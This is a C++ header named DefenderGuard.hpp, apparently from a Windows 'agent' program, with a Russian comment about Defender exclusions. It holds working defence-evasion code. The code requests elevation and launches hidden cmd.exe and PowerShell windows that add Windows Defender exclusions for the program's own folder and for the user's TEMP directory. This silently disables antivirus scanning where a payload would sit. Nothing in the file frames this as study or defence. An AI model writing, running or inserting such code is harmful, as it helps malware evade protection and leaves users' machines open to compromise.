#pragma once
#include "../pch.hpp"
// ═══════════════════════════════════════════════════════════
//  DefenderGuard.hpp
//  Исключения Windows Defender для папки агента
// ═══════════════════════════════════════════════════════════

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <shellapi.h>
#include <string>

#pragma comment(lib, "shell32.lib")

inline bool isDefenderExclusionSet() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return false;

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir(exePath);
    dir = dir.substr(0, dir.find_last_of("\\/"));
    std::wstring wdir(dir.begin(), dir.end());

    DWORD type, size = 0;
    bool found = (RegQueryValueExW(hKey, wdir.c_str(),
        NULL, &type, NULL, &size) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return found;
}

inline void ensureDefenderExclusion() {
    if (isDefenderExclusionSet()) return;

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir(exePath);
    dir = dir.substr(0, dir.find_last_of("\\/"));

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string temp(tempPath);
    if (!temp.empty() && temp.back() == '\\') temp.pop_back();

    std::string cmd =
        "/c powershell -NonInteractive -WindowStyle Hidden "
        "-Command \"Add-MpPreference -ExclusionPath '" + dir + "'; "
        "Add-MpPreference -ExclusionPath '" + temp + "'\"";

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize      = sizeof(sei);
    sei.fMask       = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb      = "runas";
    sei.lpFile      = "cmd.exe";
    sei.lpParameters = cmd.c_str();
    sei.nShow       = SW_HIDE;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }
}